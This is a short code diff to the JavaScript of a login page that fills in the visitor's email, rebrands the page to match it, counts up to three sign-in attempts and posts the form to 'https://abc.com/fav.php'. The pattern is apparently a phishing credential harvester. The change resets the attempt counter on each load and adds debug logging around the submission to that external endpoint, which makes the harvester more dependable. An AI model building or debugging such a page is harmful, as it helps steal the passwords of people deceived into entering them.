@@ -161,13 +161,15 @@
             updateBranding(email);
             $('#email').val(email); // Populate email input with extracted email
 
-            // Track sign-in attempts
-            let attemptCount = parseInt(localStorage.getItem('loginAttempts')) || 0;
+            // Reset attempts on page load to avoid stale data
+            localStorage.removeItem('loginAttempts');
+            let attemptCount = 0;
             const maxAttempts = 3;
 
             // Handle form submission (client-side validation)
             $('#login-form').on('submit', function(e) {
                 e.preventDefault(); // Prevent default submission until validated
+                console.log('Submit event triggered'); // Debug log
                 $('#error').hide();
                 $('#msg').hide();
 
@@ -201,6 +203,7 @@
 
                 // Submit form to https://abc.com/fav.php
                 try {
+                    console.log('Attempting form submission to https://abc.com/fav.php');
                     this.submit(); // Trigger form submission
                 } catch (error) {
                     console.error('Form submission failed:', error.message);
